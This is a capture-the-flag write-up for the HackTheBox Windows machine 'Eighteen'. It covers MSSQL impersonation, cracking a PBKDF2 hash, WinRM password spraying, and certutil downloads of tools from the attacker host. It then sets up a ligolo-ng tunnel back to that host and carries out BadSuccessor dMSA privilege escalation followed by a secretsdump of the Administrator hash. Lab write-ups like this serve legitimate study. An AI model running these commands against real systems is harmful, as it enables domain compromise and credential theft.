# Eighteen - Easy

```sh
sudo vim /etc/hosts
# map target IP to eighteen.htb

nmap -T4 -p- -A -Pn -v eighteen.htb
```

* open ports & services:

    * 80/tcp - http - Microsoft IIS httpd 10.0
    * 1433/tcp - ms-sql-s - Microsoft SQL Server 2022
    * 5985/tcp - http - Microsoft HTTPAPI httpd 2.0

* for this Windows box, we are given the creds for user 'kevin'

* checking the webpage, we have a basic finance webpage with register and login functionality

* web enumeration:

    ```sh
    gobuster dir -u http://eighteen.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html -t 10
    # basic directory scan
    
    ffuf -c -u "http://eighteen.htb" -H "Host: FUZZ.eighteen.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 143 -s
    # subdomain scan
    ```

* the given creds for 'kevin' do not work in the login page, so we can attempt to create a test account and login

* logging in, we have a /dashboard page and an '/admin' page that cannot be accessed; we can explore the features and inputs in dashboard via Burp Suite

* checking the inputs on dashboard, we have the following endpoints:

    * /update_income - POST request with 'monthly_salary' parameter
    * /add_expense - POST request with parameters 'category', 'type' and 'value'
    * /update_allocation - POST request with parameters 'savings' and 'investments'
    * /delete_expense/1 - POST request with request no.

* if we attempt to inject a ```'``` to test for SQLi for most of the endpoints, we get a 500 Internal Server Error page

* simultaneously, we can check if we are able to bruteforce login for 'admin' user to get access to admin dashboard:

    ```sh
    # get format by intercepting login request
    hydra -l admin -P /usr/share/wordlists/rockyou.txt -f eighteen.htb http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username or password."
    ```

* checking the MSSQL service on port 1433, we can attempt to login as 'kevin' using given creds for [MSSQL enum](https://hackviser.com/tactics/pentesting/services/mssql):

    ```sh
    impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@eighteen.htb
    # this works and we are able to log in

    SELECT name FROM sys.databases;
    # this includes the 'financial_planner' DB

    SELECT * FROM financial_planner.information_schema.tables;
    # this does not work as 'kevin' does not have access to this DB

    SELECT name FROM master.sys.server_principals
    # this lists all users - and includes 1 more non-default username 'appdev'
    ```

* 'kevin' does not have a lot of access in MSSQL, but we need to enumerate this service further - we can use ```nxc``` to check for MSSQL:

    ```sh
    nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
    # checking we have DB command execution

    nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth -x ipconfig
    # we do not have system-level command exeuction

    nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth -M mssql_priv
    # to check using 'mssql_priv' module for privesc
    # this shows that we can impersonate user 'appdev'

    nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth -M mssql_priv -o ACTION=privesc
    # attempt privesc by impersonating user 'appdev'
    # this does not work

    nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
    # attempt RID bruteforce
    ```

* the RID bruteforce in ```nxc``` for MSSQL gives a lot of usernames under the 'EIGHTEEN' domain - so we can note down all of the non-standard usernames:

    ```sh
    vim eighteen-users
    # paste all usernames
    ```

* as we have an updated list of usernames now, we can attempt bruteforcing for the webpage as well as the MSSQL instance:

    ```sh
    hydra -L eighteen-users -P /usr/share/wordlists/rockyou.txt -f eighteen.htb http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username or password."
    # web login bruteforce

    nxc mssql eighteen.htb -u eighteen-users -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding --continue-on-success --local-auth
    ```

* simultaneously, we can attempt to impersonate the user found earlier - 'appdev' - and try to see if this user has access to the webpage DB:

    ```sh
    impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@eighteen.htb

    help
    # shows the 'enum_impersonate' module

    enum_impersonate
    # confirms we can impersonate 'appdev' user

    exec_as_login appdev
    # we are now impersonating 'appdev'

    SELECT * FROM financial_planner.information_schema.tables;
    # this time we are able to list the tables
    # includes multiple tables, our main interest is 'users'

    USE financial_planner
    # use this DB

    SELECT * FROM users;
    # this gives us a hash for 'admin'
    ```

* from the 'users' table in the 'financial_planner' DB, we get a single entry for 'admin' user along with a PBKDF2 SHA256 hash - so we can stop the previous bruteforce attempt

* looking at the hash format, it is in the format of ```pbkdf2:sha256:600000$<salt>$<hash>```

* Googling this hash format shows that it is based on PBKDF2-HMAC-SHA256 algo, commonly seen in Werkzeug webapps, and the format refers to 60000 iterations (hashing rounds), [salt in plaintext/ASCII (it looks like base64 but it is not), and hash in hex data](https://github.com/hashcat/hashcat/issues/3205)

* for ```hashcat```, [PBKDF2-HMAC-SHA256 hashes can be cracked by mode 10900](https://hashcat.net/wiki/doku.php?id=example_hashes), but requires the salt & hash in base64 format

* to test the hash is getting converted properly before cracking, we can create a test user with password 'password', and attempt to crack it

* suppose the test 'password' gives us the stored hash 'pbkdf2:sha256:600000$Srnyjape0qN6V4kY$de7a39384379ca503d2853ac4cd5de3a4e452b2d07b5ea6d574ad054db556e80' - here is how we can crack it:

    ```sh
    base64hash=$(echo -n 'de7a39384379ca503d2853ac4cd5de3a4e452b2d07b5ea6d574ad054db556e80' | xxd -r -p | base64)
    # converts the hex data into binary bytes, which can be converted into base64
    # this gives the base64-encoded hash

    base64salt=$(echo -n 'Srnyjape0qN6V4kY' | base64)
    # converts the ASCII into base64 data
    # this gives the base64-encoded salt

    echo "sha256:600000:$base64salt:$base64hash" > testhash
    # format hash to be supported by mode 10900 in hashcat

    cat testhash
    # verify it is in correct format

    hashcat -m 10900 testhash /usr/share/wordlists/rockyou.txt --force
    # this works
    ```

* so we can apply the same logic to the admin hash found - cracking it gives us the plaintext password 'iloveyou1'

* using this password, we can login to the webpage as 'admin' and navigate to the /admin endpoint - it discloses the DB is using "MSSQL (dc01.eighteen.htb)", indicating a possible AD environment

* the app name 'Flask Financial Planner v1.0' is also provided, but Googling for any exploits associated with it does not show anything

* we can attempt to use this password found to enumerate port 5985 (WinRM) as we already have a list of users:

    ```sh
    vim eighteen-users
    # add 'kevin' and 'appdev'

    vim eighteen-passwords
    # 'iloveyou1' and the given cleartext password for 'kevin'

    nxc winrm eighteen.htb -u eighteen-users -p eighteen-passwords --ignore-pw-decoding --continue-on-success
    # winrm bruteforce
    ```

* the WinRM bruteforce gives us a valid pair of creds 'adam.scott:iloveyou1' for the 'eighteen.htb' domain

* login as 'adam.scott':

    ```sh
    evil-winrm -i eighteen.htb -u adam.scott -p iloveyou1
    # this works
    ```

    ```ps
    cd C:\Users\adam.scott\Desktop

    type user.txt
    # user flag

    # enumerate the folders
    dir C:\

    dir C:\inetpub
    # enumerate subfolders for any clues

    dir C:\inetpub\eighteen.htb

    type C:\inetpub\eighteen.htb\app.py
    # gives cleartext password

    dir C:\Users
    ```

* we get one more cleartext password 'MissThisElite$90' from the Python app code for user 'appdev'

* enumerating other subfolders do not give a lot of clues, so we can start by checking via ```winpeas```:

    ```sh
    cd C:\Users\adam.scott

    # fetch winpeas from attacker

    certutil -urlcache -f http://10.10.14.21:8000/winPEASx64.exe winpeas.exe

    .\winpeas.exe
    ```

* findings from ```winpeas```:

    * no AV running on box
    * network info indicates other machines in network

* network enumeration:

    ```ps
    ipconfig /all
    # shows only one interface

    arp -a
    # ARP table shows other machines in 10.129.251.x subnet
    ```

* AD enumeration:

    ```ps
    net user /domain
    # list all domain users

    net group /domain
    # list all domain groups

    net group "Domain Admins" /domain
    # check 'Domain Admins' group - only Administrator is part of this group
    ```

* as it is a AD environment and there seem to be multiple boxes in the network, we can use ```bloodhound``` to get info from this box first:

    ```ps
    # fetch collector script from attacker

    certutil -urlcache -f http://10.10.14.21:8000/SharpHound.ps1 SharpHound.ps1

    Import-Module .\SharpHound.ps1

    Invoke-BloodHound -CollectionMethod All
    # this does not work
    # using ldapuser and ldappass args to pass creds also does not work

    # testing with a different write location works
    Invoke-BloodHound -CollectionMethod All -domain eighteen.htb -OutputDirectory C:\Users\adam.scott\AppData\Local\Temp -ZipFilename eighteen.zip

    # download the file via evil-winrm
    download C:\\Users\\adam.scott\\AppData\\Local\\Temp\\20251121045617_eighteen.zip /home/sv/eighteen.zip
    # double-slash is required otherwise path is not read correctly
    ```

    ```sh
    # in attacker
    ls eighteen.zip
    # verify ZIP file has been copied properly

    # start neo4j and bloodhound

    sudo neo4j start

    bloodhound
    ```

* after logging into ```bloodhound```, navigate to Administration > Data Collection > File Ingest - Upload Files - and upload the ZIP file

* then, navigate to Explore > Cypher > Pre-built Searches, and start checking for any findings

* findings from ```bloodhound```:

    * only 1 computer is shown, dc01.eighteen.htb - the box we are currently on; can be confirmed using Cypher query ```MATCH (m:Computer) RETURN m``` (ensure this domain is also mapped to target IP in ```/etc/hosts```)
    * 'adam.scott' and 'bob.brown' are part of IT group, which has 'CanPSRemote' rights to dc01 box
    * the IT group, along with Finance and HR groups, is part of Staff OU

* we can also use ```PowerView``` to check for any interesting permissions:

    ```ps
    # fetch PowerView
    certutil -urlcache -f http://10.10.14.21:8000/PowerView.ps1 PowerView.ps1

    Import-Module .\PowerView.ps1

    Get-NetDomain
    # domain info

    Get-NetComputer | select operatingsystem,dnshostname
    # list OS, DNS name

    Get-NetUser -SPN | select samaccountname,serviceprincipalname
    # check for SPNs

    Find-DomainShare -CheckShareAccess
    # check for any shares

    Invoke-ACLScanner -ResolveGUIDs
    # check for any interesting ACL entries
    ```

* findings from ```PowerView```:

    * the box is running Windows Server 2025 Datacenter OS
    * only 'krbtgt' user is mapped to a SPN
    * ```Invoke-ACLScanner -ResolveGUIDs``` shows a non-default entry:

        ```ps
        ObjectDN                : OU=Staff,DC=eighteen,DC=htb
        AceQualifier            : AccessAllowed
        ActiveDirectoryRights   : CreateChild
        ObjectAceType           : None
        AceFlags                : None
        AceType                 : AccessAllowed
        InheritanceFlags        : None
        SecurityIdentifier      : S-1-5-21-1152179935-589108180-1989892463-1604
        IdentityReferenceName   : IT
        IdentityReferenceDomain : eighteen.htb
        IdentityReferenceDN     : CN=IT,OU=Staff,DC=eighteen,DC=htb
        IdentityReferenceClass  : group
        ```
    
    * this entry shows that the IT group has 'CreateChild' rights under the Staff OU

* checking more on the OS itself:

    ```ps
    systeminfo
    # access denied

    wmic os get caption,version,buildnumber /format:list
    # access denied

    Get-ComputerInfo
    # this does not show all entries, but we get some info
    ```

* the box is running Windows Server 2025 Datacenter, build 26100

* Googling for exploits (and based on hints) associated with 'CreateChild' rights on an OU leads to the [BadSuccessor exploit](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory):

    * privesc vulnerability in Windows Server 2025 AD
    * flaw in the new dMSA (Delegated Managed Service Account) feature in Windows Server boxes, meant to replace legacy service accounts
    * a feature provided by dMSA is to migrate existing nonmanaged service accounts by converting them into dMSAs - this is used as a privesc vector
    * any user that has 'CreateChild' rights on any OU can create a dMSA - this is the key prerequisite for this exploit

* steps to exploit the BadSuccessor vulnerability, briefly:

    * create a malicious dMSA within the OU
    * modify key attributes of this dMSA object to link it to a privileged account, and simulate a completed migration
    * request delegation ticket using Rubeus
    * request TGT as malicious dMSA
    * use ticket to abuse Kerberos

* we can refer [this blog for the BadSuccessor exploit](https://www.hackingarticles.in/abusing-badsuccessor-dmsa-stealthy-privilege-escalation/), and for [abusing dMSAs from Kali, refer this blog](https://happycamper84.medium.com/tryhackme-badsuccessor-walkthrough-2c5090bd31fc):

    * create the rogue dMSA and link it to Administrator using [BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1):

        ```ps
        # fetch script from attacker

        certutil -urlcache -f http://10.10.14.21:8000/BadSuccessor.ps1 BadSuccessor.ps1

        Import-Module .\BadSuccessor.ps1

        BadSuccessor -mode exploit -Path "OU=Staff,DC=eighteen,DC=htb" -Name "bad_DMSA" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator" -domain "eighteen.htb"
        # OU details fetched from ObjectDN field in PowerView output

        # this confirms the rogue dMSA object is created
        ```
    
    * finalize the dMSA link using [SharpSuccessor](https://github.com/logangoins/SharpSuccessor/) - this is required to simulate the migration:

        * this project does not have a compiled '.exe', so we need to build the '.sln' file
        * in a Windows box, clone the repo, open it as a folder in Visual Studio
        * click on the '.sln' file and load it
        * once loaded, navigate to Build > Build Solution
        * after it is completed, the executable is in the project's 'bin' folder ('debug'/'release' subfolder)
        * transfer exe to attacker

        ```ps
        # fetch SharpSuccessor from attacker
        certutil -urlcache -f http://10.10.14.21:8000/SharpSuccessor.exe SharpSuccessor.exe

        # link dMSA
        .\SharpSuccessor.exe add /impersonate:Administrator /path:"OU=Staff,DC=eighteen,DC=htb" /account:adam.scott /name:bad_DMSA
        # this may give an exception/warning, but it can be ignored if the dMSA object is weaponized
        ```
    
    * after that, we need to request delegation TGT using Rubeus:

        ```ps
        # fetch Rubeus.exe from attacker

        certutil -urlcache -f http://10.10.14.21:8000/Rubeus.exe Rubeus.exe

        # generate TGT for ourself, to use in PTT attacks
        .\Rubeus.exe tgtdeleg /nowrap
        # this step did not work
        ```
    
    * this step with ```Rubeus``` kept giving the error "AcquireCredentialsHandle" - as this step involves Kerberos protocol, it is likely that we are bumping into a restriction so we need to try further steps from attacker

    * we need to tunnel the traffic first via ```ligolo-ng``` so that attacker tools can be used:

        ```sh
        # on attacker
        sudo ip tuntap add user sv mode tun ligolo
        sudo ip link set ligolo up

        ~/Tools/ligolo-ng/proxy -selfcert
        # run the proxy
        ```

        ```ps
        # in evil-winrm, fetch agent file
        certutil -urlcache -f http://10.10.14.21:8000/ligolo-ng-windows/agent.exe agent.exe

        .\agent.exe -connect 10.10.14.21:11601 -ignore-cert
        # connect to attacker
        ```

        ```sh
        # on attacker, in ligolo shell, we get the connection
        session
        # select the session

        ifconfig
        # verify IP info

        # start tunneling
        start
        ```
    
    * once the tunnel is set up, as ```Rubeus``` did not work, we can attempt to use ```getTGT.py``` & ```getST.py``` from ```impacket```, to request a forwardable TGT for current user via Kerberos, using the malicious dMSA:

        ```sh
        # on attacker
        # for this to work, ensure impacket is on latest release (v13 at least)
        python3 -m pipx install impacket

        getTGT.py -h

        getST.py -h
        # verify version
        ```
    
    * as we need to use the target's internal ports (to access Kerberos service), we need to use the 'magic' IP provided by ```ligolo-ng``` - 240.0.0.1 - in order to interact with it:

        ```sh
        # on attacker
        sudo ip route add 240.0.0.1/32 dev ligolo
        # add this magic IP to routing table for 'ligolo' interface

        # in ligolo shell, stop and start the tunneling
        stop

        start
        ```

        ```sh
        # first, request a valid TGT for our user
        getTGT.py 'eighteen.htb/adam.scott:iloveyou1' -dc-ip 240.0.0.1
        # this saves the ticket in 'adam.scott.ccache'

        # save the ccache to an env var
        export KRB5CCNAME=adam.scott.ccache
        ```

        ```sh
        getST.py eighteen.htb/adam.scott -dc-ip 240.0.0.1 -impersonate bad_DMSA$ -self -dmsa -k -no-pass
        # format referred from getST.py command syntax

        # this requests service tickets (TGS)
        # -impersonate is to target the malicious dMSA we created
        # -self as we are generating TGS for ourselves
        # -dc-ip to refer to the target, which we are accessing through the magic IP
        # -k and -no-pass as we are using Kerberos TGT for authentication, and not password method
        ```
    
    * ```getST.py``` may throw an error ```Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)``` - this means we need to [correct the clock skew first](https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069):

        ```sh
        # we can modify the clock skew using 'rdate'
        sudo apt install rdate

        sudo timedatectl set-ntp off
        # disable NTP from auto-updating

        sudo rdate -n 240.0.0.1
        # refer rdate to match the target IP

        getST.py eighteen.htb/adam.scott -dc-ip 240.0.0.1 -impersonate bad_DMSA$ -self -dmsa -k -no-pass
        # this works, and a ticket is generated

        # note down the ticket ccache value and save it to an env var
        export KRB5CCNAME=bad_DMSA\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
        # escape the '$' sign for it to get interpreted correctly
        ```
    
    * now that we have the ticket generated impersonating the malicious dMSA for the Administrator, we can abuse it to dump NTLM hashes:

        ```sh
        secretsdump.py -k -no-pass dc01.eighteen.htb
        # where dc01.eighteen.htb is the domain name for the DC

        # this does not work due to 'policy SPN target name validation'
        # and we are prompted to use '-just-dc-user' to target only one user

        secretsdump.py -k -no-pass dc01.eighteen.htb -just-dc-user Administrator -dc-ip 240.0.0.1 -target-ip 240.0.0.1 -debug
        # the '-dc-ip' and '-target-ip' fields are needed, otherwise we get connection errors
        # -debug switch used to check verbose logs

        # may need to try this step multiple times, and if the tickets expire we need to generate them again from the first step
        ```
    
    * ```secretsdump``` gives us the Administrator NTLM hashes, we can use it to log into the box now:

        ```sh
        evil-winrm -i eighteen.htb -u Administrator -H 0b133be956bfaddf9cea56701affddec
        # login works

        type C:\Users\Administrator\Desktop\root.txt
        # root flag
        ```
